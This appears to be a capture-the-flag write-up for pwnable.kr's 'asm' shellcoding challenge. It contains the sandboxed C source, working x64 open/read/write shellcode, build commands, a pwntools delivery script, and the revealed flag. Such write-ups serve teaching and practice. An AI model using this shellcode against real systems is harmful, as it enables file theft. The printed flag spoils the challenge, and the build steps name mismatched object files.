# asm
## Analysis

```sh
asm
asm.c
.bash_history/
.irssi/
.pwntools-cache/
readme
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
```

We write x64 shellcode to read flag using only `open`, `read`, `write`, and `exit`.

In x64 assembly, it's basically just:

- `xor register, register`: set register = 0.
- `rdi, rsi, rdx` are function arguments 1, 2, 3
  - `dil, sil, dl` represent the low byte.
- When `syscall`, `rax` / `al` (low byte of rax) acts as **System Call Number**.
  - read = 0
  - write = 1
  - open = 2
  - exit = 60

## Solution

Start with x64 shellcode
```nasm
section .text
  global _start

_start:
  jmp trick

main_logic:
  pop rdi

  ...

trick:
  call main_logic
  db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0
```

We utilize a technique called `Jump Call Pop` in assembly to load string dynamically in memory. In this case, the flag filename is saved into `rdi`.

### Open

```nasm
xor rax,rax ; rax = 0
mov al,2    ; low byte of rax = 2 (open)
xor rsi,rsi ; rsi = 0
xor rdx,rdx ; rdx = 0
syscall     ; only argument is rdi which is flag filename

; returns a file descriptor in rax
```

### Read

```nasm
mov rdi,rax ; rdi = fd (first argument)
xor rax,rax ; rax = 0
sub rsp,200 ; allocate 200 bytes in stack
mov rsi,rsp ; 200 bytes buffer (second argument)
xor rdx,rdx ; rdx = 0
mov dl,200  ; low byte of rdx = 200 (third argument)
syscall     ; read(fd flag, 200 buffer, 200 length)

; returns number of bytes read in rax
```

### Write

```nasm
mov rdx,rax ; numbers of byte read (third argument)
xor rax,rax
mov al,1    ; (write)
xor rdi,rdi
mov dil,1   ; (first argument, 0 = stdin, 1 = stdout)
mov rsi,rsp ; the same 200 bytes buffer (second argument)
syscall     ; write(stdout, buffer, length)
```

### Exit

```nasm
xor rax,rax
mov al,60   ; exit
xor rdi,rdi ; rdi = 0 (first argument)
syscall     ; exit(0)
```

### Combine all

Look at `asm.asm`.

Assemble to Object File using:

```sh
nasm -f elf64 -o shell.o asm.asm
```

Link object file into an ELF executable:

```sh
ld -nostdlib -o shell shellcode.o
```

Extract Raw Bytes:

```sh
objcopy -O binary --only-section=.text shell output.bin
```

`solve.py`

```py
from pwn import *
p = remote('pwnable.kr',10015)
# context.log_level='debug'

with open('output.bin', 'rb') as f:
    payload = f.read()

print(len(payload))
p.recvuntil(b'give me your x64 shellcode:')
p.sendline(payload)
p.interactive()
```
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10015: Done
305
[*] Switching to interactive mode
 Mak1ng_5helLcodE_i5_veRy_eaSy
[*] Got EOF while reading in interactive
$  
```

Flag: `Mak1ng_5helLcodE_i5_veRy_eaSy`